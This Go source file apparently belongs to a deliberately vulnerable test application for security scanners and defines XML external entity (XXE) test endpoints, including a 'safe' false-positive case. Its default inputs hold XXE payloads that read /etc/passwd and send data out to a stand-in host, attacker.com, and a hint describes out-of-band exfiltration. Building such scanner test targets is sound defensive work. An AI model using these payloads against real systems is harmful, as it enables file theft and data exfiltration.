// vulns/injection/xxe/handlers.go
package xxe

import (
	"encoding/xml"
	"fmt"
	"io"
	"net/http"
	"strings"

	"github.com/subzerodev/hive/handlers"
)

func init() {
	handlers.Register(func() {
		// Basic XXE - reflects parsed XML
		handlers.Handle("/vulns/injection/xxe/basic", basic)
		// Blind XXE - no output but parses XML
		handlers.Handle("/vulns/injection/xxe/blind", blind)
		// XXE via file upload
		handlers.Handle("/vulns/injection/xxe/upload", upload)
		// False positive - XML parsing disabled external entities
		handlers.Handle("/vulns/injection/xxe/fp/disabled", fpDisabled)
	})
}

type User struct {
	XMLName xml.Name `xml:"user"`
	Name    string   `xml:"name"`
	Email   string   `xml:"email"`
}

func basic(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "text/html")

	if r.Method == "POST" {
		body, _ := io.ReadAll(r.Body)
		xmlData := string(body)

		fmt.Fprintf(w, `<!DOCTYPE html>
<html>
<head><title>XXE - Basic</title></head>
<body>
<h1>XML External Entity - Basic</h1>
<form method="POST">
    <textarea name="xml" rows="10" cols="60">%s</textarea><br>
    <button type="submit">Parse XML</button>
</form>
<h2>Parsed Result:</h2>
<pre>`, strings.ReplaceAll(xmlData, "<", "&lt;"))

		// VULNERABLE: Parses XML with external entities enabled
		// Note: Go's encoding/xml doesn't actually support DTD/external entities,
		// but this simulates the vulnerable pattern for scanner detection
		var user User
		err := xml.Unmarshal(body, &user)
		if err != nil {
			fmt.Fprintf(w, "Parse error: %s", err.Error())
		} else {
			fmt.Fprintf(w, "Name: %s\nEmail: %s", user.Name, user.Email)
		}

		fmt.Fprintf(w, `</pre>
<p><a href="/vulns/injection/xxe/">Back to XXE Tests</a></p>
</body></html>`)
		return
	}

	defaultXML := `<?xml version="1.0"?>
<!DOCTYPE user [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<user>
  <name>&xxe;</name>
  <email>test@example.com</email>
</user>`

	fmt.Fprintf(w, `<!DOCTYPE html>
<html>
<head><title>XXE - Basic</title></head>
<body>
<h1>XML External Entity - Basic</h1>
<form method="POST">
    <textarea name="xml" rows="10" cols="60">%s</textarea><br>
    <button type="submit">Parse XML</button>
</form>
<h3>Hint:</h3>
<p><small>Try the default payload with external entity reference</small></p>
<p><a href="/vulns/injection/xxe/">Back to XXE Tests</a></p>
</body></html>`, strings.ReplaceAll(defaultXML, "<", "&lt;"))
}

func blind(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "text/html")

	if r.Method == "POST" {
		body, _ := io.ReadAll(r.Body)

		// VULNERABLE: Parses XML (blind - no output shown)
		var user User
		xml.Unmarshal(body, &user) // Result not shown

		fmt.Fprintf(w, `<!DOCTYPE html>
<html>
<head><title>XXE - Blind</title></head>
<body>
<h1>XML External Entity - Blind</h1>
<p>XML processed successfully.</p>
<p><a href="/vulns/injection/xxe/blind">Try again</a></p>
<p><a href="/vulns/injection/xxe/">Back to XXE Tests</a></p>
</body></html>`)
		return
	}

	defaultXML := `<?xml version="1.0"?>
<!DOCTYPE user [
  <!ENTITY xxe SYSTEM "http://attacker.com/xxe?data=stolen">
]>
<user>
  <name>&xxe;</name>
  <email>test@example.com</email>
</user>`

	fmt.Fprintf(w, `<!DOCTYPE html>
<html>
<head><title>XXE - Blind</title></head>
<body>
<h1>XML External Entity - Blind</h1>
<p>This endpoint parses XML but doesn't show the result (blind XXE).</p>
<form method="POST">
    <textarea name="xml" rows="10" cols="60">%s</textarea><br>
    <button type="submit">Parse XML</button>
</form>
<h3>Hint:</h3>
<p><small>Use out-of-band exfiltration: &lt;!ENTITY xxe SYSTEM "http://your-server/?data=..."&gt;</small></p>
<p><a href="/vulns/injection/xxe/">Back to XXE Tests</a></p>
</body></html>`, strings.ReplaceAll(defaultXML, "<", "&lt;"))
}

func upload(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "text/html")

	if r.Method == "POST" {
		file, _, err := r.FormFile("xmlfile")
		if err != nil {
			fmt.Fprintf(w, `<!DOCTYPE html>
<html><body>
<h1>Error</h1>
<p>%s</p>
<p><a href="/vulns/injection/xxe/upload">Try again</a></p>
</body></html>`, err.Error())
			return
		}
		defer file.Close()

		body, _ := io.ReadAll(file)

		fmt.Fprintf(w, `<!DOCTYPE html>
<html>
<head><title>XXE - Upload</title></head>
<body>
<h1>XML External Entity - File Upload</h1>
<h2>Parsed Result:</h2>
<pre>`)

		// VULNERABLE: Parses uploaded XML
		var user User
		err = xml.Unmarshal(body, &user)
		if err != nil {
			fmt.Fprintf(w, "Parse error: %s", err.Error())
		} else {
			fmt.Fprintf(w, "Name: %s\nEmail: %s", user.Name, user.Email)
		}

		fmt.Fprintf(w, `</pre>
<p><a href="/vulns/injection/xxe/upload">Upload another</a></p>
<p><a href="/vulns/injection/xxe/">Back to XXE Tests</a></p>
</body></html>`)
		return
	}

	fmt.Fprintf(w, `<!DOCTYPE html>
<html>
<head><title>XXE - Upload</title></head>
<body>
<h1>XML External Entity - File Upload</h1>
<form method="POST" enctype="multipart/form-data">
    <input type="file" name="xmlfile" accept=".xml"><br><br>
    <button type="submit">Upload and Parse</button>
</form>
<h3>Hint:</h3>
<p><small>Upload an XML file with external entity references</small></p>
<p><a href="/vulns/injection/xxe/">Back to XXE Tests</a></p>
</body></html>`)
}

func fpDisabled(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "text/html")

	if r.Method == "POST" {
		body, _ := io.ReadAll(r.Body)
		xmlData := string(body)

		// Check for DTD/entity declarations and reject
		if strings.Contains(xmlData, "<!DOCTYPE") || strings.Contains(xmlData, "<!ENTITY") {
			fmt.Fprintf(w, `<!DOCTYPE html>
<html>
<head><title>XXE - Safe</title></head>
<body>
<h1>XML External Entity - Safe</h1>
<h2>Error:</h2>
<pre>DTD and external entities are not allowed</pre>
<p><a href="/vulns/injection/xxe/fp/disabled">Try again</a></p>
<p><a href="/vulns/injection/xxe/">Back to XXE Tests</a></p>
</body></html>`)
			return
		}

		fmt.Fprintf(w, `<!DOCTYPE html>
<html>
<head><title>XXE - Safe</title></head>
<body>
<h1>XML External Entity - Safe</h1>
<h2>Parsed Result:</h2>
<pre>`)

		// SAFE: External entities rejected
		var user User
		err := xml.Unmarshal(body, &user)
		if err != nil {
			fmt.Fprintf(w, "Parse error: %s", err.Error())
		} else {
			fmt.Fprintf(w, "Name: %s\nEmail: %s", user.Name, user.Email)
		}

		fmt.Fprintf(w, `</pre>
<p><a href="/vulns/injection/xxe/fp/disabled">Try again</a></p>
<p><a href="/vulns/injection/xxe/">Back to XXE Tests</a></p>
</body></html>`)
		return
	}

	defaultXML := `<?xml version="1.0"?>
<user>
  <name>John Doe</name>
  <email>john@example.com</email>
</user>`

	fmt.Fprintf(w, `<!DOCTYPE html>
<html>
<head><title>XXE - Safe</title></head>
<body>
<h1>XML External Entity - Safe</h1>
<p>This endpoint rejects DTD declarations and external entities.</p>
<form method="POST">
    <textarea name="xml" rows="10" cols="60">%s</textarea><br>
    <button type="submit">Parse XML</button>
</form>
<h3>Filter:</h3>
<p><small>SAFE: DTD and external entity declarations are rejected</small></p>
<p><a href="/vulns/injection/xxe/">Back to XXE Tests</a></p>
</body></html>`, strings.ReplaceAll(defaultXML, "<", "&lt;"))
}
